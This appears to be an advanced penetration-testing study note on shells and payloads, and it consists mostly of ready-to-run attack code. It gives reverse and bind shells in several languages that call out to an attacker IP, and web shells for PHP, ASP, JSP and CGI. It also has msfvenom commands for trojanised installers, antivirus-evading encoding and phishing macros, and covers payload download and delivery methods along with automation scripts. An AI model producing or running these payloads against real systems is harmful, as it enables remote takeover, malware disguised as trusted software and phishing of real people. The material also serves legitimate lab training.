---
tags: [module/shells-payloads, shells, payloads, reverse-shell, bind-shell, web-shell, msfvenom, automation, level/advanced, practical]
---

# Shells and Payloads - Practical Application

## Complete Shells and Payloads Workflow

Phase 1: Understanding Shell Types
Phase 2: Reverse Shells Deep Dive
Phase 3: Bind Shells Deep Dive
Phase 4: Web Shells
Phase 5: Msfvenom Payload Generation
Phase 6: Payload Delivery Methods
Phase 7: Automation

---

## Phase 1: Understanding Shell Types

### Shell Comparison Matrix

| Type | Connection Direction | Firewall Bypass | Use Case |
|------|---------------------|-----------------|----------|
| Reverse Shell | Target -> Attacker | Bypasses inbound blocks | Target can make outbound connections |
| Bind Shell | Attacker -> Target | Bypasses outbound blocks | Target cannot make outbound connections |
| Web Shell | HTTP Requests | Uses port 80/443 | Web servers, restricted environments |

---

## Phase 2: Reverse Shells Deep Dive

### Netcat Reverse Shell

# On attacker (listener)
nc -lvnp 4444

# On target (Linux)
nc -e /bin/sh YOUR-IP 4444

# On target (Windows)
nc.exe -e cmd.exe YOUR-IP 4444

### Bash Reverse Shell

# On target
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1

# Alternative
0<&196;exec 196<>/dev/tcp/YOUR-IP/4444; sh <&196 >&196 2>&196

### Python Reverse Shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### PHP Reverse Shell

php -r '$sock=fsockopen("YOUR-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

### Perl Reverse Shell

perl -e 'use Socket;$i="YOUR-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Ruby Reverse Shell

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR-IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### PowerShell Reverse Shell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('YOUR-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

---

## Phase 3: Bind Shells Deep Dive

### Netcat Bind Shell

# On target (Linux)
nc -lvnp 4444 -e /bin/sh

# On target (Windows)
nc -lvnp 4444 -e cmd.exe

# On attacker
nc TARGET-IP 4444

### Bash Bind Shell

# On target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 4444 > /tmp/f

### Python Bind Shell

python -c 'exec("import socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1);s.bind((\"0.0.0.0\",4444));s.listen(1);conn,addr=s.accept();while 1:data=conn.recv(1024);if data==\"exit\n\":conn.close();else:proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);conn.send(proc.stdout.read()+proc.stderr.read())")'

### PowerShell Bind Shell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

---

## Phase 4: Web Shells

### PHP Web Shell

Save as shell.php:
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Usage: http://target.com/shell.php\?cmd\=whoami

### PHP Web Shell with Authentication

<?php
$auth = false;
$user = 'admin';
$pass = 'password';

if ($_SERVER['PHP_AUTH_USER'] == $user && $_SERVER['PHP_AUTH_PW'] == $pass) {
    $auth = true;
}

if ($auth && isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

### ASP Web Shell

<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("cmd.exe /c " & Request.QueryString("cmd"), 0, False)
%>

### JSP Web Shell

<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>

### Python Web Shell (CGI)

#!/usr/bin/env python
import cgi, subprocess
print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')
if cmd:
    print("<pre>")
    print(subprocess.getoutput(cmd))
    print("</pre>")

---

## Phase 5: Msfvenom Payload Generation

### Msfvenom Basics

# List all payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# List formats
msfvenom -l formats

### Windows Payloads

# Windows reverse shell (staged)
msfvenom -p windows/shell/reverse_tcp LHOST=YOUR-IP LPORT=4444 -f exe -o shell.exe

# Windows reverse shell (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter reverse
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=4444 -f exe -o meter.exe

# Windows bind shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# Windows executable embedded in installer
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f exe -x /path/to/putty.exe -o putty.exe

### Linux Payloads

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f elf -o shell.elf

# Linux bind shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# Linux Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=4444 -f elf -o meter.elf

### Web Payloads

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=YOUR-IP LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f asp -o shell.asp

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f war -o shell.war

### Scripting Payloads

# Python
msfvenom -p cmd/unix/reverse_python LHOST=YOUR-IP LPORT=4444 -f raw

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=YOUR-IP LPORT=4444 -f raw

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=YOUR-IP LPORT=4444 -f raw

# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f ps1 -o shell.ps1

### Encoding Payloads

# Shikata ga nai (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Multiple encoders
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/call4_dword_xor -i 3 -f exe -o super-encoded.exe

---

## Phase 6: Payload Delivery Methods

### Web Server Delivery

# Start web server
python3 -m http.server 8000

# Download on target (Windows)
certutil -urlcache -f http://YOUR-IP:8000/shell.exe shell.exe

# Download on target (Linux)
wget http://YOUR-IP:8000/shell.elf -O /tmp/shell.elf

### SMB Delivery

# Start SMB server
sudo impacket-smbserver share /path/to/payloads

# Download on target
copy \\YOUR-IP\share\shell.exe C:\Windows\Temp\shell.exe

### FTP Delivery

# Start FTP server
sudo python3 -m pyftpdlib --port 21

# Download on target
(New-Object Net.WebClient).DownloadFile('ftp://YOUR-IP/shell.exe', 'shell.exe')

### Macro Delivery (Phishing)

# Generate VBA payload
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f vba -o shell.vba

### HTA Delivery

# Generate HTA
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f hta-psh -o shell.hta

### Certutil Delivery (Windows)

certutil -urlcache -f http://YOUR-IP:8000/shell.exe shell.exe
certutil -split -f http://YOUR-IP:8000/shell.exe shell.exe

---

## Phase 7: Automation

### Reverse Shell Generator Script

Save as reverse-shell-gen.py:

#!/usr/bin/env python3
import argparse

def generate_reverse_shell(lhost, lport, shell_type):
    shells = {
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'nc': f"nc -e /bin/sh {lhost} {lport}",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
        'ruby': f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    }
    
    if shell_type in shells:
        return shells[shell_type]
    else:
        return "Shell type not found"

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--lhost', required=True)
    parser.add_argument('--lport', required=True, type=int)
    parser.add_argument('--type', required=True, choices=['bash','nc','python','php','perl','ruby','powershell'])
    args = parser.parse_args()
    
    cmd = generate_reverse_shell(args.lhost, args.lport, args.type)
    print(cmd)

### Multi-Handler Script (Metasploit)

Save as handler.rc:

use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z

Run with:
msfconsole -r handler.rc

### Payload Delivery Script

Save as deliver-payload.sh:

#!/bin/bash
PAYLOAD=$1
LHOST=$2
LPORT=$3

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o /tmp/payload.exe

# Start listener in background
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit" &

# Start web server
cd /tmp && python3 -m http.server 8000

---

## Shells and Payloads Cheatsheet

| Type | Command |
|------|---------|
| Netcat listener | nc -lvnp 4444 |
| Bash reverse | bash -i >& /dev/tcp/IP/4444 0>&1 |
| Python reverse | python -c 'import...' |
| PHP reverse | php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");' |
| PowerShell reverse | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client..." |
| Msfvenom windows | msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe |
| Msfvenom linux | msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf |
| Msfvenom php | msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php |
| Web shell (PHP) | <?php system($_GET['cmd']); ?> |

---

## Key Takeaways

- Reverse shell = target connects to you
- Bind shell = you connect to target
- Web shell = command execution via HTTP
- Msfvenom generates payloads for all platforms
- Different languages for different targets
- Always have a listener ready
- Use encoding to evade AV
- Deliver payloads via web, SMB, FTP, etc.
- Automate with scripts for efficiency
- Practice all shell types in the lab
- The more you know, the more options you have
- "Catching a shell" is just the beginning
